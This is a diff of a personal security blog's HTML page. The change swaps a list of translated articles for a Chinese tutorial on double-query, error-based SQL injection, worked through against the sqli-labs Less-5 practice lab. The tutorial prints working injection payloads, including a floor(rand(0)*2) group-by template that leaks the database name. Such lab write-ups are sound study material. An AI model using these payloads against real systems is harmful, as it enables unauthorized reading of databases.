@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="写在开始前翻译安全技术文章的初衷，是为了自己能够从中学习思路，帮助自己进步。投稿于安全平台也是为了与大家一起学习dalao思路。 不是任何安全技术文章都翻译，觉得思路奇特或者觉得由肺腑发出“这是真dalao”之感想的会赶紧翻译下来以便日后查阅、学习。 安全技术文章翻译合集1、H1的一场Write up:https://www.freebuf.com/articles/web/190465.html">
+<meta name="description" content="0x01 原理Double Query原理分析参考：Sql注入：双查询科普：双查询注入 当order by判断完字段数，但是union select 1,2,3,…不在页面显示返回位时。可以尝试双查询注入。 双查询注入就是嵌套子查询，简单说就是select(select)的形式。 数据库查询要么返回正确的查询结果，要么返回报错信息。双注入查询其实是一种报错查询，将我们需要的信息当作数据库错误返回。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安全技术文章翻译合集">
-<meta property="og:url" content="http://yoursite.com/2018/12/09/安全技术文章翻译合集 /index.html">
+<meta property="og:title" content="SQL注入之Double Query">
+<meta property="og:url" content="http://yoursite.com/2018/12/17/SQL注入之Double Query/index.html">
 <meta property="og:site_name" content="Angie&#39;s blog">
-<meta property="og:description" content="写在开始前翻译安全技术文章的初衷，是为了自己能够从中学习思路，帮助自己进步。投稿于安全平台也是为了与大家一起学习dalao思路。 不是任何安全技术文章都翻译，觉得思路奇特或者觉得由肺腑发出“这是真dalao”之感想的会赶紧翻译下来以便日后查阅、学习。 安全技术文章翻译合集1、H1的一场Write up:https://www.freebuf.com/articles/web/190465.html">
+<meta property="og:description" content="0x01 原理Double Query原理分析参考：Sql注入：双查询科普：双查询注入 当order by判断完字段数，但是union select 1,2,3,…不在页面显示返回位时。可以尝试双查询注入。 双查询注入就是嵌套子查询，简单说就是select(select)的形式。 数据库查询要么返回正确的查询结果，要么返回报错信息。双注入查询其实是一种报错查询，将我们需要的信息当作数据库错误返回。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-09T15:30:17.330Z">
+<meta property="og:updated_time" content="2018-12-17T15:38:27.465Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安全技术文章翻译合集">
-<meta name="twitter:description" content="写在开始前翻译安全技术文章的初衷，是为了自己能够从中学习思路，帮助自己进步。投稿于安全平台也是为了与大家一起学习dalao思路。 不是任何安全技术文章都翻译，觉得思路奇特或者觉得由肺腑发出“这是真dalao”之感想的会赶紧翻译下来以便日后查阅、学习。 安全技术文章翻译合集1、H1的一场Write up:https://www.freebuf.com/articles/web/190465.html">
+<meta name="twitter:title" content="SQL注入之Double Query">
+<meta name="twitter:description" content="0x01 原理Double Query原理分析参考：Sql注入：双查询科普：双查询注入 当order by判断完字段数，但是union select 1,2,3,…不在页面显示返回位时。可以尝试双查询注入。 双查询注入就是嵌套子查询，简单说就是select(select)的形式。 数据库查询要么返回正确的查询结果，要么返回报错信息。双注入查询其实是一种报错查询，将我们需要的信息当作数据库错误返回。">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/12/09/安全技术文章翻译合集 /"/>
+  <link rel="canonical" href="http://yoursite.com/2018/12/17/SQL注入之Double Query/"/>
 
 
 
 
 
-  <title>安全技术文章翻译合集 | Angie's blog</title>
+  <title>SQL注入之Double Query | Angie's blog</title>
   
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/安全技术文章翻译合集 /">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/17/SQL注入之Double Query/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Angie Q">
@@ -249,7 +249,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">安全技术文章翻译合集</h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入之Double Query</h1>
         
 
         <div class="post-meta">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T23:29:47+08:00">
-                2018-12-09
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-17T23:15:47+08:00">
+                2018-12-17
               </time>
             
 
@@ -284,8 +284,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术文章翻译/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术文章翻译</span>
+                  <a href="/categories/sql注入/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
                   </a>
                 </span>
 
@@ -321,9 +321,19 @@
       
 
       
-        <h2 id="写在开始前"><a href="#写在开始前" class="headerlink" title="写在开始前"></a>写在开始前</h2><p>翻译安全技术文章的初衷，是为了自己能够从中学习思路，帮助自己进步。投稿于安全平台也是为了与大家一起学习dalao思路。</p>
-<p>不是任何安全技术文章都翻译，觉得思路奇特或者觉得由肺腑发出“这是真dalao”之感想的会赶紧翻译下来以便日后查阅、学习。</p>
-<h2 id="安全技术文章翻译合集"><a href="#安全技术文章翻译合集" class="headerlink" title="安全技术文章翻译合集"></a>安全技术文章翻译合集</h2><h3 id="1、H1的一场Write-up"><a href="#1、H1的一场Write-up" class="headerlink" title="1、H1的一场Write up:"></a>1、H1的一场Write up:</h3><p><a href="https://www.freebuf.com/articles/web/190465.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/190465.html</a></p>
+        <h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><h2 id="Double-Query原理分析"><a href="#Double-Query原理分析" class="headerlink" title="Double Query原理分析"></a>Double Query原理分析</h2><p>参考：<br><a href="https://lyiang.wordpress.com/2015/04/06/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%8F%8C%E6%9F%A5%E8%AF%A2/" target="_blank" rel="noopener">Sql注入：双查询</a><br><a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">科普：双查询注入</a></p>
+<p>当order by判断完字段数，但是union select 1,2,3,…不在页面显示返回位时。可以尝试<strong>双查询注入</strong>。</p>
+<p><strong>双查询注入</strong>就是嵌套子查询，简单说就是select(select)的形式。</p>
+<p>数据库查询要么返回正确的查询结果，要么返回报错信息。双注入查询其实是一种报错查询，将我们需要的信息当作数据库错误返回。</p>
+<p>这里利用了Error Based分析过的floor(rand(0)*2)引起报错的原理。</p>
+<p><strong>用法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1 from (select count(*),concat(floor(rand(0)*2),(注入爆数据语句))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x02-Sqli-labs"><a href="#0x02-Sqli-labs" class="headerlink" title="0x02 Sqli-labs"></a>0x02 Sqli-labs</h1><p>以下为Sqli-labs的双注入查询的题目。</p>
+<h2 id="Less-5-Double-Query-Single-Quote-String"><a href="#Less-5-Double-Query-Single-Quote-String" class="headerlink" title="Less-5 Double Query- Single Quote -String"></a>Less-5 Double Query- Single Quote -String</h2><p>题目信息：Please input the ID as parameter with numeric value</p>
+<p>根据题目信息：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1</a><br>尝试了两个最经典的payload:<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> and ‘1’=’1<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> and ‘1’=’2<br>确认sql注入存在。</p>
+<p>字段数payload:<br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> order by 3<br>至少为3</p>
+<p>但是此时利用 union select 1,2,3 发现页面没有返回位。</p>
+<p>根据题目信息尝试双查询注入,payload:<br><strong>爆数据库名</strong><br><a href="http://43.247.91.228:84/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-5/?id=1&#39;</a> union select 1 from (select count(<em>),concat(floor(rand(0)</em>2),(database()))a from information_schema.tables group by a)b –+</p>
+<p>依据上述公式替换爆数据语句即可获取数据库信息。</p>
 
       
     </div>
@@ -348,8 +358,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/10/OWASPtop10md/" rel="next" title="OWASP TOP 10(2017)整理">
-                <i class="fa fa-chevron-left"></i> OWASP TOP 10(2017)整理
+              <a href="/2018/12/15/SQL注入之Error Based/" rel="next" title="sqli-labs之Error Based(原理&题目)">
+                <i class="fa fa-chevron-left"></i> sqli-labs之Error Based(原理&题目)
               </a>
             
           </div>
@@ -357,10 +367,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/15/SQL注入之Error Based/" rel="prev" title="sqli-labs之Error Based(原理&题目)">
-                sqli-labs之Error Based(原理&题目) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -492,7 +498,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在开始前"><span class="nav-number">1.</span> <span class="nav-text">写在开始前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全技术文章翻译合集"><span class="nav-number">2.</span> <span class="nav-text">安全技术文章翻译合集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、H1的一场Write-up"><span class="nav-number">2.1.</span> <span class="nav-text">1、H1的一场Write up:</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-原理"><span class="nav-number">1.</span> <span class="nav-text">0x01 原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Query原理分析"><span class="nav-number">1.1.</span> <span class="nav-text">Double Query原理分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Sqli-labs"><span class="nav-number">2.</span> <span class="nav-text">0x02 Sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-Double-Query-Single-Quote-String"><span class="nav-number">2.1.</span> <span class="nav-text">Less-5 Double Query- Single Quote -String</span></a></li></ol></li></ol></div>
             
 
           </div>
